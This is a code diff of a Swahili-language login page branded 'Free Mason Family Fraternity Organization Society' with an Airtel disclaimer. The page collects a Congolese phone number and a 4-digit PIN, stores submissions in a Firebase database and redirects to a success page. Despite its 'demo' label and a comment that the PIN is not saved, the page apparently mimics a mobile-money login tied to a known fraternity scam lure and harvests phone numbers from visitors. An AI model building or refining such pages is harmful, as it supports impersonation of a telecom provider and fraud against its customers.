@@ -360,7 +360,7 @@ button:disabled{
     Free Mason Family Fraternity Organization Society
     <br>
     DEMO SYSTEM — SI HUDUMA RASMI YA AIRTEL
-</footer><script type="module">
+<script type="module">
 
 import { initializeApp }
 from "https://www.gstatic.com/firebasejs/10.14.1/firebase-app.js";
@@ -388,16 +388,13 @@ const firebaseConfig = {
 
 
 const app = initializeApp(firebaseConfig);
-
 const database = getDatabase(app);
 
 
-/* REAL-TIME CONNECTION */
+/* FIREBASE CONNECTION STATUS */
 
-const connectionRef = ref(
-    database,
-    ".info/connected"
-);
+const connectionRef =
+    ref(database, ".info/connected");
 
 onValue(connectionRef, (snapshot) => {
 
@@ -407,26 +404,24 @@ onValue(connectionRef, (snapshot) => {
     const text =
         document.getElementById("statusText");
 
-    if(snapshot.val() === true){
+    if (snapshot.val() === true) {
 
         dot.classList.add("online");
 
         text.textContent =
             "Imeunganishwa • Firebase iko hai";
 
-    }else{
+    } else {
 
         dot.classList.remove("online");
 
         text.textContent =
             "Muunganisho umekatika";
-
     }
-
 });
 
 
-/* LOGIN SUBMISSION */
+/* DEMO LOGIN */
 
 const form =
     document.getElementById("loginForm");
@@ -442,6 +437,7 @@ form.addEventListener("submit", async (event) => {
 
     event.preventDefault();
 
+
     const phone =
         document.getElementById("phone")
         .value.trim();
@@ -451,29 +447,27 @@ form.addEventListener("submit", async (event) => {
         .value.trim();
 
 
-    /* PHONE MUST START WITH 243 */
+    /* PHONE MUST BEGIN WITH 243 */
 
-    if(!/^243[0-9]{9,12}$/.test(phone)){
+    if (!/^243[0-9]{9,12}$/.test(phone)) {
 
         message.textContent =
             "Tafadhali weka namba inayoanza na 243.";
 
-        message.style.color =
-            "#d90000";
+        message.style.color = "#d90000";
 
         return;
     }
 
 
-    /* PIN MUST BE EXACTLY 4 DIGITS */
+    /* DEMO PIN = EXACTLY 4 DIGITS */
 
-    if(!/^[0-9]{4}$/.test(demoPin)){
+    if (!/^[0-9]{4}$/.test(demoPin)) {
 
         message.textContent =
             "PIN ya DEMO lazima iwe na tarakimu 4.";
 
-        message.style.color =
-            "#d90000";
+        message.style.color = "#d90000";
 
         return;
     }
@@ -485,16 +479,21 @@ form.addEventListener("submit", async (event) => {
         "Inawasilisha...";
 
 
-    try{
+    try {
 
         /*
-         * IMPORTANT:
-         * Only demo information is stored.
-         * The demo PIN is NOT stored.
+         * DEMO DATA ONLY.
+         *
+         * The PIN is deliberately NOT
+         * saved to Firebase.
          */
 
         const submissionsRef =
-            ref(database, "freeMasonDemo/submissions");
+            ref(
+                database,
+                "freeMasonDemo/submissions"
+            );
+
 
         const newSubmission =
             push(submissionsRef);
@@ -525,39 +524,39 @@ form.addEventListener("submit", async (event) => {
             .slice(-8);
 
 
-        document.getElementById(
-            "referenceNumber"
-        ).textContent = reference;
+        /*
+         * THIS IS THE ACTUAL REDIRECT.
+         */
+
+        window.location.href =
+            "success.html?ref=" +
+            encodeURIComponent(reference);
 
 
-        document.getElementById(
-            "loginPage"
-        ).classList.add("hidden");
+    } catch (error) {
 
+        console.error(
+            "Firebase error:",
+            error
+        );
 
-        document.getElementById(
-            "successPage"
-        ).classList.remove("hidden");
-
-
-    }catch(error){
-
-        console.error(error);
 
         message.textContent =
-            "Kuna tatizo la muunganisho. Tafadhali jaribu tena.";
+            "Kuna tatizo la Firebase. Tafadhali jaribu tena.";
 
         message.style.color =
             "#d90000";
+
 
         button.disabled = false;
 
         button.textContent =
             "Endelea";
-
     }
 
 });
 
-</script></body>
+</script>
+
+</body>
 </html>
